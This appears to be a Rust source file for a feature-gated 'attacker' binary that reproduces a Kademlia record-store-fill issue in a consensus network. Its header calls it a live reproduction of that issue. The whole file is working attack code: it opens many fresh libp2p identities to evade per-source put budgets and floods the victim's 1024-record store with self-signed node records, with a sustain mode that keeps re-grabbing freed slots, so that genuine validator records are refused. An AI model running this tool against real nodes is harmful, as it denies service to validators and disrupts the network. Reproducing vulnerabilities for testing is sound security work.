//! Live-reproduction attacker for the kad-store-fill issue. Compiled only with the
//! `kadfill-test-hooks` feature, so a normal build never contains it.
//!
//! It models any connectable peer with no stake and no committee seat. It opens N independent
//! libp2p identities (N QUIC connections, N source peer ids, to get past the victim's per-source
//! put budget of 10 per 60s), and from each pushes self-signed node records under freshly minted
//! BLS keys into the victim's primary kad record store. Each record is built exactly as a real node
//! builds its own (`NodeRecord::build` + the production `encode`), so the victim accepts and stores
//! it. The goal is to fill the victim's 1024-record store so a later, genuine post-genesis record
//! is refused with `MaxRecords` and the deliverer is never bound.
//!
//! Usage:
//!   kadfill-attacker <victim-multiaddr-with-/p2p/> [--puts-per-id P] [--concurrency C]
//!                    [--flush-secs S] [--duration-secs D] [--identities N]
//!
//! With `--duration-secs D` the attacker keeps running waves of fresh identities until D elapses,
//! so any slot that frees on the victim is re-grabbed before a new validator can take it. Without
//! it, it runs `--identities N` once.

// This binary links the whole network crate but uses only a few of its dependencies.
#![allow(unused_crate_dependencies)]

use std::{error::Error, iter, time::Duration};

use futures::StreamExt;
use libp2p::{
    identity, kad,
    kad::{store::MemoryStore, RecordKey},
    multiaddr::Protocol,
    swarm::SwarmEvent,
    Multiaddr, PeerId, StreamProtocol, SwarmBuilder,
};
use rayls_consensus_network::types::NodeRecord;
use rayls_infrastructure_config::KeyConfig;
use rayls_infrastructure_types::{encode, BlsKeypair, BlsSigner};

type Res<T> = Result<T, Box<dyn Error + Send + Sync>>;

// Must match crates/consensus/network/src/consensus/types.rs
const PRIMARY_KAD_PROTO: &str = "/narwhal/primary/kad/1.0.0";

type Behaviour = kad::Behaviour<MemoryStore>;

/// A self-signed record under a fresh BLS + network identity: what any peer can mint for free.
fn mint_record() -> kad::Record {
    let keys = KeyConfig::new_with_testing_key(BlsKeypair::generate(&mut rand::rng()));
    let netkey = keys.primary_network_public_key();
    let peer_id: PeerId = netkey.clone().into();
    // A dial hint only; its contents never need to be reachable.
    let addr: Multiaddr = "/ip4/127.0.0.1/udp/1/quic-v1".parse().unwrap();
    let node_record = NodeRecord::build(netkey, addr, |data| keys.request_signature_direct(data));
    kad::Record {
        key: RecordKey::new(&keys.primary_public_key()),
        value: encode(&node_record),
        publisher: Some(peer_id),
        expires: None,
    }
}

fn build_swarm() -> Res<libp2p::Swarm<Behaviour>> {
    let id_keys = identity::Keypair::generate_ed25519();
    let local_peer = PeerId::from(id_keys.public());
    let mut cfg = kad::Config::new(StreamProtocol::new(PRIMARY_KAD_PROTO));
    cfg.set_kbucket_inserts(kad::BucketInserts::Manual);
    let swarm = SwarmBuilder::with_existing_identity(id_keys)
        .with_tokio()
        // The victim's quic handshake_timeout is 65s; libp2p's default is 5s, too short when the
        // victim event loop is servicing many concurrent handshakes. Match the victim's generous
        // timeout so a slow handshake is not torn down mid-negotiation.
        .with_quic_config(|mut c| {
            c.handshake_timeout = Duration::from_secs(60);
            c
        })
        .with_behaviour(|_| Behaviour::with_config(local_peer, MemoryStore::new(local_peer), cfg))
        .map_err(|e| format!("build behaviour: {e}"))?
        .with_swarm_config(|c| c.with_idle_connection_timeout(Duration::from_secs(30)))
        .build();
    Ok(swarm)
}

/// One attacker identity: dial the victim, push `puts` records once connected, wait `flush` for the
/// PUT RPCs to go out, then return (the connection drops; stored records persist on the victim).
async fn run_identity(
    victim: PeerId,
    victim_addr: Multiaddr,
    puts: usize,
    flush: Duration,
    verbose: bool,
) -> Res<usize> {
    let mut swarm = build_swarm()?;
    swarm.behaviour_mut().add_address(&victim, victim_addr.clone());
    swarm.dial(victim_addr)?;

    let mut sent = 0usize;
    // Give up on an identity after this long if it cannot even connect, so a wave never stalls.
    let hard_deadline = tokio::time::Instant::now() + Duration::from_secs(70);
    let mut flush_deadline: Option<tokio::time::Instant> = None;
    loop {
        let sleep_until = flush_deadline.unwrap_or(hard_deadline);
        tokio::select! {
            _ = tokio::time::sleep_until(sleep_until) => break,
            event = swarm.select_next_some() => match event {
                SwarmEvent::ConnectionEstablished { peer_id, .. } if peer_id == victim && sent == 0 => {
                    if verbose { eprintln!("CONNECTED to victim; sending {puts} puts"); }
                    for _ in 0..puts {
                        swarm.behaviour_mut().put_record_to(mint_record(), iter::once(victim), kad::Quorum::One);
                        sent += 1;
                    }
                    flush_deadline = Some(tokio::time::Instant::now() + flush);
                }
                SwarmEvent::OutgoingConnectionError { error, peer_id, .. } => {
                    if verbose { eprintln!("dial error to {peer_id:?}: {error}"); }
                }
                SwarmEvent::ConnectionClosed { peer_id, cause, .. } if peer_id == victim => {
                    if verbose { eprintln!("victim connection CLOSED: {cause:?}"); }
                }
                _ => {}
            }
        }
    }
    Ok(sent)
}

/// Split a `/.../p2p/<peerid>` multiaddr into (dialable-addr-with-p2p, victim peer id).
fn parse_victim(addr: &str) -> Res<(Multiaddr, PeerId)> {
    let ma: Multiaddr = addr.parse()?;
    let peer = ma.iter().find_map(|p| match p {
        Protocol::P2p(id) => Some(id),
        _ => None,
    });
    match peer {
        Some(id) => Ok((ma, id)),
        None => Err(format!("victim multiaddr must include /p2p/<peerid>: {addr}").into()),
    }
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> Res<()> {
    let mut args = std::env::args().skip(1);
    let victim_arg = args.next().ok_or("need victim multiaddr as the first argument")?;
    let mut identities = 130usize;
    let mut puts_per_id = 10usize;
    let mut concurrency = 10usize;
    let mut flush_secs = 4u64;
    let mut duration_secs = 0u64;
    while let Some(flag) = args.next() {
        let val = args.next().ok_or_else(|| format!("flag {flag} needs a value"))?;
        match flag.as_str() {
            "--identities" => identities = val.parse()?,
            "--puts-per-id" => puts_per_id = val.parse()?,
            "--concurrency" => concurrency = val.parse()?,
            "--flush-secs" => flush_secs = val.parse()?,
            "--duration-secs" => duration_secs = val.parse()?,
            other => return Err(format!("unknown flag {other}").into()),
        }
    }
    let (victim_addr, victim) = parse_victim(&victim_arg)?;
    let verbose = std::env::var("KAD_DEBUG").is_ok();
    eprintln!(
        "attacking {victim} at {victim_addr}: {puts_per_id} puts/identity, {concurrency} at a time"
    );

    let flush = Duration::from_secs(flush_secs);
    let mut total = 0usize;
    let mut done = 0usize;
    let start = tokio::time::Instant::now();
    let sustain = duration_secs > 0;
    let deadline = start + Duration::from_secs(duration_secs);
    loop {
        if sustain {
            if tokio::time::Instant::now() >= deadline {
                break;
            }
        } else if done >= identities {
            break;
        }
        let wave = if sustain { concurrency } else { concurrency.min(identities - done) };
        let mut tasks = Vec::with_capacity(wave);
        for _ in 0..wave {
            let a = victim_addr.clone();
            tasks.push(tokio::spawn(async move {
                run_identity(victim, a, puts_per_id, flush, verbose).await
            }));
        }
        for t in tasks {
            match t.await {
                Ok(Ok(n)) => total += n,
                Ok(Err(e)) => eprintln!("identity error: {e}"),
                Err(e) => eprintln!("join error: {e}"),
            }
        }
        done += wave;
        eprintln!("progress: {done} identities done, {total} puts sent");
    }
    eprintln!("done: {total} put requests sent across {done} identities");
    Ok(())
}
